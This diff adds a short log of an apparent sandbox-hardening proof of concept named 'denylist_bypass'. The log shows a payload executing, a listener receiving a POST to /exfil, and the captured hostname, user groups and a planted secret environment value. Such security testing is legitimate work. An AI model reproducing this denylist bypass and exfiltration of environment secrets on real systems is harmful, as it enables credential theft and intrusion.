@@ -1,0 +1,10 @@
+[2026-11-22T10:08:23Z] START A_denylist_bypass src=A pure=poc.denylist_bypass.v1 payload=payloads/denylist_bypass.py port=8923
+[*] src=/tmp/opencode/julep-hard/A
+[*] pure=poc.denylist_bypass.v1 bundle=4926e98cd735327bfe125b55433c7156d3e6c1c9b426c1d1ff1cac66979d2013 signer=2152f8d19b791d24453242e15f2eab6cb7cffa7b6a5ed30097960e069881db12
+[*] registered tier=native_venv
+[listener] POST /exfil 430 bytes
+[+] exfil proof sha256=837464424689adb7428c6ce9461d47d5ec9fe1c3742f6f0060b3e64cb9db837f
+[*] return value: {"exfiltrated": true, "proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8394, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}}
+[*] elapsed=0.08s
+PROBE_RESULT {"proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8394, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}, "proof_sha256": "837464424689adb7428c6ce9461d47d5ec9fe1c3742f6f0060b3e64cb9db837f", "result": "EXECUTED", "value": {"exfiltrated": true, "proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8394, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}}}
+[2026-11-22T10:08:23Z] END A_denylist_bypass rc=0
